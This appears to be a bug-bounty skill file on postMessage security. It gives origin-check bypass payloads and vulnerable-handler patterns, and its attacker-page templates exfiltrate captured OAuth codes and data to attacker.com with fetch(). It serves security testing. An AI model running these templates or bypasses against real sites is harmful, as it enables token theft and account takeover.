---
name: postmessage-security
description: postMessage origin validation bypass, message handler injection, and cross-origin data exfiltration
depends_on: [xss]
---

# postMessage Security

Cross-window messaging attack surface: origin validation bypass, handler injection, OAuth token theft via postMessage, and cross-origin data exfiltration. Covers `window.postMessage`, `window.opener`, `window.parent`, `BroadcastChannel`, and iframe bridge patterns.

## Discovery Signals

| Signal | Where to Look | What It Indicates |
|--------|--------------|-------------------|
| `addEventListener("message"` or `onmessage =` | JS bundles, inline scripts | postMessage handler exists; audit origin check and data sinks |
| `postMessage(` with `"*"` as targetOrigin | JS bundles, SDK scripts | Broadcast to any origin; sensitive data leak if payload contains tokens/URLs |
| `event.origin` absent inside message handler | Handler function body | No origin gate; any window can send messages to this handler |
| `event.source === window.opener` without `event.origin` | Handler guards | Source-only check; attacker becomes opener via `window.open` |
| `.endsWith(`, `.startsWith(`, `.indexOf(`, `.includes(` near `event.origin` | Origin validation logic | String comparison anti-pattern; bypassable via domain crafting |
| `.search(` used on origin/host strings | SDK origin validation | Implicit RegExp coercion; `.` in attacker domain becomes wildcard |
| `?parentOrigin=` or `?parent=` or `?host=` in iframe URLs | URL parameters on cross-origin iframes | Self-declared origin; attacker controls the trust anchor |
| `window.opener` references without `noopener` | Link tags, `window.open` calls | Tab-nabbing and opener-based message injection surface |
| `gapi`, `proxy.html`, `bridge`, `XDFrame` in iframe URLs | DOM inspection, network tab | Cross-origin RPC proxy; high-value first-party auth bridge |
| OAuth callback with `postMessage` to opener | OAuth redirect pages, SSO flows | Token/code delivery via postMessage; audit targetOrigin |
| `$.ajax(` or `eval(` or `innerHTML` consuming `event.data` | Handler data flow to sinks | Direct XSS or SSRF primitive via message injection |
| Third-party widget scripts (Marketo, Drift, HubSpot, Intercom) | Script tags, network resources | Known-vulnerable postMessage handler libraries propagated across sites |

## Attack Surface

**Receiver-side handlers** (target accepts messages):
- `window.addEventListener("message", handler)` -- the primary surface
- `$(window).on("message", handler)` -- jQuery variant
- `window.onmessage = handler` -- legacy assignment
- `self.onmessage` in workers/service workers

**Sender-side calls** (target broadcasts data):
- `window.postMessage(data, targetOrigin)` -- wildcard `"*"` leaks to any opener/parent
- `window.opener.postMessage(data, origin)` -- OAuth popup-to-opener flow
- `window.parent.postMessage(data, origin)` -- iframe-to-parent communication
- `frames[n].postMessage(data, origin)` -- parent-to-iframe communication

**Cross-window references**:
- `window.opener` -- accessible when opened via `window.open` without `noopener`
- `window.parent` / `window.top` -- accessible from iframes (SOP restricts reads, not postMessage)
- `window.frames[n]` / `window.frames["name"]` -- positional and named frame access
- `BroadcastChannel` -- same-origin broadcast; XSS on any same-origin page can listen

## High-Value Targets

- OAuth callback pages using `postMessage` to return `code`/`access_token` to opener
- SSO/login bridge iframes (`/bridge`, `/auth/iframe`, SDK proxy pages)
- Google `gapi` proxy iframes (`clients6.google.com/static/proxy.html`)
- Payment gateway iframes (Stripe, Adyen, Braintree postMessage bridges)
- Checkout/payment pages accepting postMessage commands from merchant iframes
- Admin panels with embedded app iframes using postMessage API
- Third-party form widgets (Marketo `XDFrame`, HubSpot, Typeform)
- Chrome extension internal pages communicating via `postMessage`
- Web IDE extension host iframes (`webWorkerExtensionHostIframe.html` in Code OSS)

## Origin Validation Bypass Matrix

| Validation Pattern | Bypass Technique | Example Payload (attacker domain) |
|-------------------|-----------------|----------------------------------|
| No `event.origin` check | Send from any window | Any attacker page; `window.open(target)` then `postMessage` |
| `origin.endsWith("target.com")` | Path suffix: put allowed host in URL path | `https://evil.com/target.com` ($1M Google bounty) |
| `origin.startsWith("https://target.com")` | Subdomain prefix on attacker domain | `https://target.com.evil.com` |
| `origin.indexOf("target.com") !== -1` | Substring match via attacker subdomain | `https://target.com.evil.com` or `https://eviltarget.com` |
| `origin.includes("target.com")` | Same as indexOf | `https://not-target.com.evil.com` |
| `origin.match(/target\.com/)` (no anchors) | Regex without `^`/`$`; substring match | `https://eviltarget.com.evil.com` |
| `origin.match(/target.com/)` (unescaped dot) | `.` matches any char | `https://targetXcom.evil.com` |
| `"trusted.com".search(event.origin)` | Implicit RegExp coercion; `.` = wildcard | Register `d.gits.co` to match `digits.com` (Twitter Digits ATO) |
| `event.source === window.opener` only | Become opener via `window.open` | Attacker page opens target; is now `window.opener` |
| Referer header as trust anchor | Suppress Referer via `<meta name="referrer" content="no-referrer">` | Empty Referer fails open; bridge returns credentials |
| `?parentOrigin=` URL parameter | Self-declared origin in iframe URL | `iframe.src="target/page?parentOrigin=https://evil.com"` (Google IDX $22.5K) |
| `?parent=` URL parameter on proxy | Attacker-claimed parent in proxy URL | `proxy.html?usegapi=1&parent=https://evil.com` ($313K Google Keep) |
| `null` origin check (sandbox/data URI) | `<iframe sandbox="allow-scripts" src="data:text/html,...">` | Origin is `null`; passes `origin === "null"` |
| `allowedOrigins.some(o => origin.includes(o))` | Any allowed string as substring in attacker domain | `https://allowed-origin.evil.com` |

## Message Handler Vulnerability Patterns

| Pattern | Vulnerability | Impact |
|---------|-------------|--------|
| `eval(event.data)` or `Function(event.data)()` | Direct code execution | XSS; full origin takeover |
| `element.innerHTML = event.data.html` | HTML injection sink | XSS via `<img onerror>`, `<svg onload>` |
| `location.href = event.data.url` | Navigation to `javascript:` URI | XSS via `javascript:alert(1)` |
| `$.ajax(event.data.ajaxParams)` | Arbitrary jQuery AJAX with `dataType:"jsonp"` | JSONP-as-XSS; attacker URL becomes script tag ($0 H1 chain) |
| `history.pushState(null, "", event.data.path)` | SPA router path injection | Navigate admin to attacker-controlled route ($500 Shopify) |
| `iframe.src = event.data.src` | Frame navigation to `javascript:` / `data:` URI | XSS in parent origin ($500K Gmail) |
| `localStorage.setItem(event.data.key, event.data.value)` | Storage overwrite | Session fixation, config poisoning |
| `document.cookie = event.data.cookie` | Cookie injection | CSRF token override, session manipulation |
| `ga.apply(null, event.data.calls)` | Google Analytics command queue abuse | Cookie read/write via `cookieName` injection ($1.6K Shopify) |
| `window.opener.postMessage(location.href, "*")` | Broadcast full URL to any opener | OAuth code/token in URL leaked to attacker |

## targetOrigin Exploitation

| Misconfiguration | Attack | Example |
|-----------------|--------|---------|
| `postMessage(data, "*")` | Any opener/parent reads sensitive data | OAuth success page broadcasts `code` to attacker opener ($0 Semrush) |
| `postMessage(data, state.origin)` where state is attacker-controlled | Derive targetOrigin from user input | `state.origin = "https://evil.com/target.com"` passes `endsWith` ($1M Google) |
| `postMessage(data, event.origin)` reflecting sender | Echo-back leaks data to any sender | Proxy reflects response to whoever asked |
| `postMessage(response, parent_param)` from URL parameter | Self-claimed parent receives the response | `?parent=https://evil.com` on gapi proxy ($313K Google Keep) |
| `postMessage(data, registeredDomain)` but no embedder check | Bridge sends to registered domain but anyone can embed iframe | Digits bridge: no check that embedder matches registered host (Twitter ATO) |
| Same-origin assumption in nested frames | Navigate nested frame to `about:blank` (inherits attacker origin) | `about:blank` hijacks postMessage channel ($3.1K Google Drive ext) |

## Cross-Window Communication Attacks

**window.opener exploitation**:
- Open target via `window.open(targetURL)` -- attacker page becomes `window.opener`
- Handlers trusting `event.source === window.opener` accept attacker messages
- Tab-nabbing: `window.opener.location = "https://phishing-clone.com"` replaces original tab
- Mitigation bypass: `rel="noopener"` prevents this; test all link/redirect paths for missing `noopener`

**window.parent / iframe attacks**:
- Embed target in iframe; parent sends messages to `contentWindow`
- Frame-tree redirection: navigate a nested iframe to redirect postMessage traffic
- Positional frame access: `window.frames[0]` works even when frame names are randomized

**Named window targeting**:
- `window.open(url, "knownName")` gets handle to existing window by name
- SPA windows with predictable names (e.g., `"checkout"`, `"login"`) can be targeted

**BroadcastChannel**:
- Same-origin broadcast; XSS on any subdomain page can listen to all channels
- Often used for tab synchronization (auth state, cart updates)

## OAuth / SSO via postMessage

| Pattern | Vulnerability | Impact |
|---------|-------------|--------|
| Popup flow: `window.opener.postMessage({code}, "*")` | Wildcard targetOrigin leaks auth code to any opener | OAuth code theft; exchange for access_token |
| Structured `state` parameter (`{ticket, origin}`) used as config | `state.origin` controls targetOrigin of response postMessage | Attacker-controlled origin receives auth code ($1M Google) |
| Browser extension OAuth via postMessage | Extension `client_secret` extractable + wildcard postMessage | Full token theft; extension secrets are public |
| SSO bridge iframe (`/bridge?app_key=X&host=Y`) | Bridge validates `host` param, not actual embedder origin | Any page embeds bridge, steals credentials (Twitter Digits) |
| Silent re-authorization (user previously approved app) | No consent dialog; popup auto-completes | Zero-click code theft for returning users |
| `redirect_uri` on domain with XSS | XSS reads `location.hash` containing `#access_token=` | Implicit flow token theft via DOM access |
| Token in URL fragment after redirect | `window.opener` or `window.parent` reads `location.hash` | Cross-origin token exfiltration via opener reference |
| iframe-based token exchange | Parent reads token from iframe via postMessage response | Attacker parent receives token if origin check is weak |

## Defense-Bypass Pairs

| Defense | Bypass | Report Reference |
|---------|--------|-----------------|
| `endsWith` allowlist for origin | Attacker domain path contains allowed suffix | $1M Google Gemini Code Assist |
| `String.search(origin)` for validation | Implicit RegExp coercion; `.` = wildcard | Twitter Digits ATO |
| `Math.random()` channel name as auth | Predict via seed recovery or leak via `postMessage("*")` | $500K Gmail XSS |
| CSP `script-src` blocking `javascript:` nav | Use IE11/legacy Edge (no CSP) or phishing via `401` basic-auth prompt | $500 HackerOne Marketo |
| `X-Frame-Options: SAMEORIGIN` on parent | Nested iframe (Hangouts) lacks XFO; redirect it to attacker content | $500K Gmail frame-tree pivot |
| Patch for specific message type | Sibling handler in same dispatch retains bug | $500 Shopify Modal.initialize |
| URL scheme denylist (`javascript:`, `data:`) | Custom scheme `abc:` + path traversal + SPA router confusion | $500 Shopify pushState bypass |
| `encodeURI()` on postMessage data field | Encoding removed in later version (regression) | Automattic Jetpack Likes chain |

## Testing Methodology

**Step 1: Enumerate handlers**
```javascript
// Inject in browser console to log all incoming messages
window.addEventListener("message", e => {
  console.log("PM:", {origin: e.origin, data: e.data, source: e.source?.location?.href});
});
```
Search JS bundles for: `addEventListener('message'`, `addEventListener("message"`, `onmessage`, `$(window).on("message"`.

**Step 2: Audit each handler**

For every handler found, answer five questions:
1. Is `event.origin` checked? Against what? (exact match, regex, string method)
2. Is `event.source` checked? (`source === window.opener` is insufficient alone)
3. Is `event.data` type-checked before use? (structured clone vs raw string)
4. Where does `event.data` flow? (trace to sinks: innerHTML, eval, location, $.ajax, iframe.src)
5. Is there a shared secret? If so, is it cryptographically random and not broadcast with `"*"`?

**Step 3: Audit each sender**

For every `postMessage` call found:
1. What is the `targetOrigin`? (`"*"` = broadcast to everyone)
2. What data is in the payload? (does it contain URLs with tokens, codes, or session data?)
3. Where does `targetOrigin` come from? (hardcoded, URL parameter, `event.origin` reflection, `state` field)

**Step 4: Test origin bypass**

```javascript
// Attacker page template
const target = window.open("https://target.com/vulnerable-page");
setTimeout(() => {
  target.postMessage({type: "expected_type", payload: "ATTACKER_DATA"}, "*");
}, 2000);
window.addEventListener("message", e => {
  // Capture any response from target
  fetch("https://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(e.data)));
});
```

**Step 5: Test iframe bridge pattern**
```html
<!-- Attacker page embeds target's proxy/bridge iframe -->
<iframe id="bridge" src="https://target.com/proxy.html?parent=https://attacker.com"></iframe>
<script>
  bridge.onload = () => {
    bridge.contentWindow.postMessage({action: "getData", auth: "1p"}, "*");
  };
  window.addEventListener("message", e => {
    // Capture bridge response
    fetch("https://attacker.com/log", {method: "POST", body: JSON.stringify(e.data)});
  });
</script>
```

**Step 6: Test OAuth postMessage flow**
```javascript
// Open OAuth flow, intercept code via postMessage
const authWin = window.open("https://target.com/oauth/authorize?client_id=X&redirect_uri=...");
window.addEventListener("message", e => {
  // If target's callback uses postMessage("*") to return code/token
  if (e.data?.code || e.data?.access_token || e.data?.url?.includes("code=")) {
    fetch("https://attacker.com/steal?data=" + encodeURIComponent(JSON.stringify(e.data)));
  }
});
```

## Validation

| Check | Pass Criteria | Fail Action |
|-------|--------------|-------------|
| Handler has no `event.origin` check | Attacker page message is processed | Confirmed: DOM XSS, data leak, or state manipulation depending on sink |
| Handler origin check uses string method | Crafted domain passes check | Confirmed: origin bypass; escalate to full exploitation |
| `postMessage("*")` sends sensitive data | Attacker opener/parent receives tokens/codes/URLs | Confirmed: data exfiltration |
| `targetOrigin` derived from user input | Manipulated input directs data to attacker | Confirmed: targeted data theft |
| Handler feeds data to DOM sink | Payload executes in target origin | Confirmed: XSS |
| Bridge iframe accepts arbitrary parent | Attacker page issues authenticated API calls | Confirmed: first-party auth proxy abuse |
| OAuth popup leaks code via postMessage | Attacker opener captures authorization code | Confirmed: OAuth code theft |

## False Positives

| Scenario | Why It Fails | Disposition |
|----------|-------------|-------------|
| Handler checks `event.origin === "https://exact.domain.com"` | Exact string match is not bypassable | Not vulnerable (unless XSS on allowed origin) |
| `postMessage` sends non-sensitive static data | No tokens/codes/PII in payload | Informational only |
| Handler uses structured clone that strips functions | Cannot inject executable code via postMessage | Sink analysis still needed for HTML/URL injection |
| CSP blocks `javascript:` navigation in all browsers | XSS via navigation sink is mitigated | Note: CSP is defense-in-depth, not root fix; report with caveat |
| `rel="noopener"` on all external links | `window.opener` is null; opener-based attacks fail | Verify ALL link paths, not just main navigation |
| Handler validates data schema strictly before use | Malformed messages rejected before reaching sink | Not vulnerable if schema validation is complete |

## Impact

| Scenario | Severity | Condition |
|----------|----------|-----------|
| XSS via postMessage on auth domain | Critical | No origin check + DOM sink (innerHTML, eval, iframe.src) |
| OAuth code/token theft via `postMessage("*")` | Critical | Auth flow uses postMessage to return code to opener |
| First-party auth proxy abuse (gapi-style) | Critical | Proxy accepts arbitrary parent; returns user data |
| Cookie read/write via library API abuse | High | postMessage controls GA/analytics command queue |
| SPA router manipulation via pushState/replaceState | High | Path injection loads attacker-controlled routes |
| Tab-nabbing via `window.opener` | Medium | Missing `noopener`; attacker replaces original tab |
| Content spoofing in widget/chat | Medium | Handler renders attacker content without origin check |
| localStorage/sessionStorage overwrite | Medium | Session fixation or config poisoning |

## Chain Patterns

| Chain | Steps | Max Bounty Seen |
|-------|-------|-----------------|
| postMessage handler + no origin check -> DOM XSS -> session hijack | 1. Send message from attacker page 2. Handler injects into innerHTML/eval 3. Steal cookies/tokens | $500K (Gmail) |
| OAuth popup + `postMessage("*")` -> code theft -> ATO | 1. Open OAuth flow 2. Intercept code via opener listener 3. Exchange code for token | $1M (Google Gemini) |
| postMessage proxy + self-claimed parent -> first-party data theft | 1. Embed proxy iframe with `?parent=attacker` 2. Issue authenticated API calls 3. Receive user data | $313K (Google Keep) |
| XSS on allowed origin -> forge postMessage -> XSS on high-value target | 1. Find XSS on widget domain 2. Send postMessage that passes origin check 3. Trigger XSS on main domain | $0 disclosed (Automattic/Jetpack) |
| postMessage + `$.ajax({dataType:"jsonp"})` -> JSONP RCE -> data theft | 1. Send message with ajaxParams 2. jQuery loads attacker JSONP 3. JS executes in iframe origin | $0 disclosed (HackerOne/Marketo) |
| Structured OAuth `state` + `endsWith` bypass -> code theft | 1. Craft `state.origin` ending in allowed host 2. Callback sends code to attacker origin | $1M (Google Gemini) |
| postMessage + GA command queue -> cookie injection -> session fixation | 1. Send analytics commands via postMessage 2. Inject cookies via `cookieName` 3. Override CSRF tokens | $1.6K (Shopify) |
| Sibling handler enumeration + scheme confusion -> admin XSS | 1. Find patched handler 2. Test sibling handlers 3. Use custom scheme (`abc:`) to bypass denylist | $500 (Shopify) |

## Pro Tips

1. **Audit third-party scripts first.** Marketo `forms2.js`, Drift widget, HubSpot, Intercom -- these propagate the same vulnerable postMessage handler across every customer site. One handler bug = hundreds of targets.

2. **`window.frames[0]` bypasses name randomization.** When a frame name is randomized (e.g., `mktoFormsXDIframe + Math.random()`), positional indexing still works. Use `targetWindow.frames[0]`, `targetWindow.frames[1]`, etc.

3. **Treat the allowed origin as your next XSS target.** When a handler validates `event.origin === "https://widgets.example.com"`, pivot: find XSS on `widgets.example.com` (even on a preview/test page). XSS there defeats the origin check on every site using that widget.

4. **Spam wins races.** Use `setInterval(() => target.postMessage(payload, "*"), 250)` to outpace legitimate messages. Interleave benign and malicious payloads to defeat single-validation gates that check the first message and trust subsequent ones.

5. **OAuth `state` is an input, not a nonce.** When `state` is structured (JSON, base64), decompose every field. If any field influences a security decision (targetOrigin, redirect, role), it is a separate attack vector. The $1M Google bounty came from a JSON `state.origin` field controlling targetOrigin.

6. **`String.search()` silently converts strings to RegExp.** Every `.` in the attacker's origin becomes a wildcard. Register a domain where dots in the trusted host align with any character: `d.gits.co` matches `digits.com` inside `search()`.

7. **Empty Referer fails open.** When a bridge uses Referer as its trust anchor, suppress it with `<meta name="referrer" content="no-referrer">`. The bridge sees empty Referer and often skips validation entirely. Test with: `Referrer-Policy: no-referrer`, `rel="noreferrer"`, `data:` URI parent, sandbox iframe.

8. **`about:blank` inherits the parent's origin.** Navigate a nested iframe to `about:blank`; it inherits the embedding page's origin. If the target sends `postMessage("*")` to what it thinks is its own child frame, your `about:blank` frame receives it.

9. **Check ALL sibling handlers after a fix.** When a postMessage handler is patched for one message type (e.g., `Shopify.API.Modal.open`), test every other message type in the same dispatch (`Shopify.API.Modal.initialize`, `Shopify.API.pushState`). Patches target specific strings, not the general validation.

10. **Library APIs are primitives when you control the caller.** Google Analytics `ga()` has cookie read/write paths. Stripe.js has DOM mutation paths. When postMessage lets you call any library function with attacker-controlled args, map the library's full API for dangerous capabilities.
